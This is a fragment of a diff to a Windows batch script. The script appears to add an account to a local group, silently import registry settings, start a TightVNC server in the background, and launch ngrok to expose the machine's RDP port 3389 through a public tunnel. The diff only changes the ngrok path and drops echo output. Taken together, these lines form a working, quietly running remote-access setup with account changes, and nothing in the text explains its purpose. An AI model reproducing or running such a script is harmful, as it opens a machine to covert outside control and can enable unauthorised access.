@@ -6,9 +6,7 @@ net localgroup %4 %2 /ADD
 regedit /S C:\CE1CECL\CE1CECL-CE1CECL\CE1CECL.reg
 net start audiosrv
 start " " /B C:\CE1CECL\CE1CECL-CE1CECL\tvnserver.exe
-start " " /B C:\CE1CECL\CE1CECL-CE1CECL\ngrok\ngrok-v3-stable-windows-amd64\ngrok.exe tcp 3389
-
-@echo on
+start " " /B C:\CE1CECL\CE1CECL-CE1CECL\ngrok.exe tcp 3389
 
 C:\CE1CECL\CE1CECL-CE1CECL\vs\Microsoft.Cryptographic.Provider.Development.Kit..CPDK..Version.8.0.exe /q /norestart /uninstall 
 :UNINSTALL-Microsoft.Cryptographic.Provider.Development.Kit..CPDK..Version.8.0.exe 
